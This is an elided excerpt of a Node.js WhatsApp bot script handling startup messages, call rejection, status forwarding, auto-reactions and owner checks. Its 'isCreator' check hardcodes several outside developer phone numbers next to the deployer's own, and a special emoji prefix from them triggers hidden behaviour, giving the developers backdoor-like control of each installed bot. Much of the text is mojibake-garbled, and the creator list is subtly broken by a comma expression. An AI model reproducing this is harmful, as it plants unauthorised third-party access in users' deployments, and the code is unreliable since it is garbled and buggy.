...
const port = process.env.PORT || 9090;
  ...
  console.log('Plugins installed вЬЕпЄП')
  console.log ('Bot connected to whatsapp вЬЕпЄП')
  const path = require('path');
  ...
  // Only send startup message if enabled in config
  if (config.SEND_STARTUP_MESSAGE === 'true') {
    let up = `*вФПвФАвФАгАФ Connected гАХвФАвФАвФАвКЈ*  
*вФЗ Prefix: ${prefix}*
*вФЗ Follow Channel:*  
*вФЗ https://shorturl.at/DYEi0*
*вФЧвФАвФАвФАвФАвФАвФАвФАвФАвФАвФАвФАвФАвФАвФАвКЈ*
> *Report any error to the dev*`;
    conn.sendMessage(conn.user.id, { image: { url: `https://url.bwmxmd.online/Adams.frqev04s.jpeg` }, caption: up })
  }
  }
  })
  ...
  try {
    ...
    for (const call of calls) {
      ...
      await conn.sendMessage(from, {
        text: config.REJECT_MSG || '*рЯУЮ біДќ±вДУвДУ …іѕГ—В ќ±вДУвДУѕГѕЙ—ФвИВ ќє…і —В–љќє—Х …ібіЬ–Љ–≤—Ф А —ГѕГѕЕ вИВѕГ…і—В –љќ±ќљ—Ф біШ—Ф А–Љќє—Х—ХќєѕГ…і*'
      });
  ...
  try {
    if (!message.quoted) {
      return await client.sendMessage(message.chat, {
        text: "*рЯШБ біШ ЯбіЗбіАsбіЗ  АбіЗбіШ Я П біЫбіП біА sбіЫбіАбіЫбіЬs!*"
      }, { quoted: message });
    }
    ...
    switch (mtype) {
      ...
      default:
        return await client.sendMessage(message.chat, {
          text: "вЭМ Only image, video, and audio messages are supported"
        }, { quoted: message });
    }
    ...
    await client.sendMessage(message.chat, {
     // text: "вЭМ Error forwarding message:\n" + error.message
    }, { quoted: message });
  }
};
...
conn.ev.on('messages.upsert', async (msg) => {
  try {
    ...
    if (!quoted) {
      await conn.sendMessage(from, { text: "*рЯОР біШ ЯбіЗбіАsбіЗ  АбіЗбіШ Я П біЫбіП біА sбіЫбіАбіЫбіЬs!*" }, { quoted: m });
      return;
    }
...
registerAntiNewsletter(conn);
 ...
 /// READ STATUS       
  ...
  const emojis = ["вЭ§пЄП", "рЯСН", "рЯШЃ", "рЯШО", "рЯТА", "рЯТЂ", "рЯФ•", "рЯСС"];
  ...
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    ...
    const emojis = ['вЭ§пЄП', 'рЯМє', 'рЯШЗ', 'вЭДпЄП', 'рЯТ•', 'рЯТѓ', 'рЯФ•', 'рЯТЂ', 'рЯТО', 'рЯТЧ', 'рЯ§Н', 'рЯЦ§', 'рЯСА', 'рЯЩМ', 'рЯЩЖ', 'рЯЂ£', 'рЯ•∞', 'рЯТР', 'рЯШО', 'рЯ§О', 'вЬЕ', 'рЯЂА', 'рЯІ°', 'рЯШБ', 'рЯШД', 'рЯМЄ', 'рЯХКпЄП', 'рЯМЈ', 'вЫЕ', 'рЯМЯ', 'вЬ®', 'рЯТЂ', 'рЯТЬ', 'рЯТЩ', 'рЯМЭ', 'рЯЦ§', 'рЯТЪ'];
  ...
  await conn.sendMessage(user, { text: text, react: { text: 'рЯТЂ', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
 ...
 conn.sendMessage(from, { text: teks }, { quoted: mek })
  ...
  const udp = botNumber.split('@')[0];
    const davex = ('923057933797', '218942841878', '254790375710', '254740007567');
    
    if (isGroup) {
                updateActivity(from, sender);
	  }
	  // ЎІџМўЖЎђЎІ џМЏ© ЎҐЎ±ЎІџМўЗ ўВЎ±ЎІЎ± ўЕџМвАМЎѓўЗџМўЕ
  ...
  let isCreator = [udp, ...davex, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') // ЎІЎЈўЕџМўЖЎІўЖ Ў≠ЎІЎµўД Џ©ўЖџМЎѓ Џ©ўЗ ЎіўЕЎІЎ±ўЗвАМўЗЎІ Ў®ўЗ ўБЎ±ўЕЎ™ ЎµЎ≠џМЎ≠ Ў™Ў®ЎѓџМўД ЎіЎѓўЗвАМЎІўЖЎѓ
    .includes(mek.sender);
	  

	  if (isCreator && mek.text.startsWith("рЯІСвАНрЯІТвАНрЯІТ")) {
 ...
 //=============DEV REACT==============
  ...
  if(senderNumber.includes("218942841878")){
  if(isReact) return
  m.react("рЯТЂ")
   }
/*if (senderNumber.includes(config.DEV)) {
  ireturn m.react("рЯЂЯ");
}
...
*/	  
  ...
  if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = [
        ...
        'вЪ™', 'рЯЯ§', 'рЯФЗ', 'рЯФК', 'рЯУҐ', 'рЯФХ', 'вЩ•пЄП', 'рЯХР', 'рЯЪ©', 'рЯЗ¶рЯЗЂ'
    ];
...
if (!isReact && senderNumber !== botNumber) {
    if (config.CUSTOM_REACT === 'true') {
        ...
        const reactions = (config.CUSTOM_REACT_EMOJIS || 'рЯ•≤,рЯШВ,рЯШР,рЯЩВ,рЯШФ').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
    }
}
...
if (!isReact && senderNumber === botNumber) {
    if (config.HEART_REACT === 'true') {
        // Use custom emojis from the configuration
        const reactions = (config.CUSTOM_REACT_EMOJIS || 'вЭ§пЄП,рЯІ°,рЯТЫ,рЯТЪ,рЯТЪ').split(',');
        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
        m.react(randomReaction);
    }
} 
...
if (isBanned) return; // Ignore banned users completely
  ...
  const ownerFile = JSON.parse(fs.readFileSync('./lib/owner.json', 'utf-8'));  // ЎЃўИЎІўЖЎѓўЖ ўБЎІџМўД
  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
  // Ў®Ў±Ў±Ў≥џМ ЎІџМўЖЏ©ўЗ ЎҐџМЎІ ўБЎ±Ў≥Ў™ўЖЎѓўЗ ЎѓЎ± owner.json ўЕўИЎђўИЎѓ ЎІЎ≥Ў™
  const isFileOwner = ownerFile.includes(sender);
  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
  // ЎІЎєўЕЎІўД ЎіЎ±ЎІџМЎЈ Ў®Ў± ЎІЎ≥ЎІЎ≥ ўИЎґЎєџМЎ™ ўЕЎІўДЏ©
